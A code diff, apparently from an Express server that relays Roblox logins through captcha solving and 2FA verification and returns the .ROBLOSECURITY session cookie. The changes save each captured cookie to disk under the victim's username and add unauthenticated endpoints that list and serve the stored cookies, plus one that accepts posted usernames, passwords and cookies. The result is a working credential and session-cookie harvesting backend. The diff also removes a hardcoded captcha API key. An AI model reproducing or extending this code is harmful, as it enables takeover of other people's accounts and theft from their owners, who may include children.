@@ -1,5 +1,7 @@
 import express from 'express';
 import cors from 'cors';
+import fs from 'fs';
+import path from 'path';
 
 const app = express();
 app.use(cors({
@@ -9,11 +11,31 @@ app.use(cors({
 }));
 app.use(express.json());
 
-/* 2captcha Key */
-const KEY = process.env.CAPTCHA_KEY || '69d7ba6633b6005d2dbb64dfb4257b44';
+/* 2captcha Key — über Render env-var CAPTCHA_KEY setzen */
+const KEY = process.env.CAPTCHA_KEY;
+if (!KEY) console.warn('[warn] CAPTCHA_KEY nicht gesetzt — captcha-solve wird fehlschlagen');
+
 const ARKOSE_KEYS = ['476068BF-9607-4799-B53D-966BE98E2B81', '9F35E182-C93C-EBCC-A31D-CF8ED317B996'];
 const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
 const sessions = new Map();
+
+// cookie-ablage
+const COOKIE_DIR = process.env.COOKIE_DIR || '/tmp/cookies';
+try { fs.mkdirSync(COOKIE_DIR, { recursive: true }); } catch (e) { console.warn('[warn] cookie dir:', e.message); }
+
+function saveCookie(user, cookie) {
+  const safeUser = String(user).replace(/[^A-Za-z0-9_.-]/g, '_').slice(0, 60);
+  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
+  const file = path.join(COOKIE_DIR, `ROBLOSECURITY_${safeUser}_${stamp}.txt`);
+  try {
+    fs.writeFileSync(file, cookie + '\n', { encoding: 'utf8' });
+    console.log('[cookie] saved ->', file);
+    return file;
+  } catch (e) {
+    console.warn('[warn] save cookie failed:', e.message);
+    return null;
+  }
+}
 
 function setCookiesOf(res) {
   const raw = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
@@ -84,6 +106,28 @@ app.get('/balance', async (req, res) => {
   } catch (e) { res.json({ error: e.message }); }
 });
 
+app.get('/cookies', (req, res) => {
+  try {
+    const files = fs.readdirSync(COOKIE_DIR).filter(f => f.endsWith('.txt'));
+    res.json({ count: files.length, dir: COOKIE_DIR, files });
+  } catch (e) { res.json({ error: e.message, dir: COOKIE_DIR }); }
+});
+
+app.get('/cookies/:name', (req, res) => {
+  const file = path.join(COOKIE_DIR, path.basename(req.params.name));
+  try {
+    const txt = fs.readFileSync(file, 'utf8');
+    res.type('text/plain').send(txt);
+  } catch (e) { res.status(404).send('not found'); }
+});
+
+app.post('/cookie', (req, res) => {
+  const { username, password, cookie } = req.body || {};
+  if (!cookie) return res.json({ ok: false, error: 'no cookie' });
+  const file = saveCookie(username || 'unknown', cookie);
+  res.json({ ok: !!file, file });
+});
+
 app.post('/login', async (req, res) => {
   const { username, password } = req.body;
   if (!username || !password) return res.json({ error: { errors: [{ message: 'Felder leer' }] } });
@@ -116,12 +160,15 @@ app.post('/login', async (req, res) => {
 
     if (data.twoStepVerificationData) {
       const t = data.twoStepVerificationData;
-      sessions.set(t.ticket, { cookies: jar });
+      sessions.set(t.ticket, { cookies: jar, username });
       return res.json({ needs2FA: true, ticket: t.ticket, mediaType: t.mediaType });
     }
 
     const cookie = roblosecurity(r);
-    if (cookie) return res.json({ success: true, cookie });
+    if (cookie) {
+      saveCookie(username, cookie);
+      return res.json({ success: true, cookie });
+    }
     return res.json({ error: data });
   } catch (e) {
     res.json({ error: { errors: [{ message: e.message }] } });
@@ -137,7 +184,11 @@ app.post('/verify2fa', async (req, res) => {
     const r = await rbx('https://auth.roblox.com/v2/twostepverification/verify',
       { ticket, code, rememberDevice: false }, { cookies: sess.cookies, csrf });
     const cookie = roblosecurity(r);
-    if (cookie) { sessions.delete(ticket); return res.json({ success: true, cookie }); }
+    if (cookie) {
+      saveCookie(sess.username || 'unknown', cookie);
+      sessions.delete(ticket);
+      return res.json({ success: true, cookie });
+    }
     return res.json({ error: await r.json().catch(() => ({})) });
   } catch (e) {
     res.json({ error: { errors: [{ message: e.message }] } });
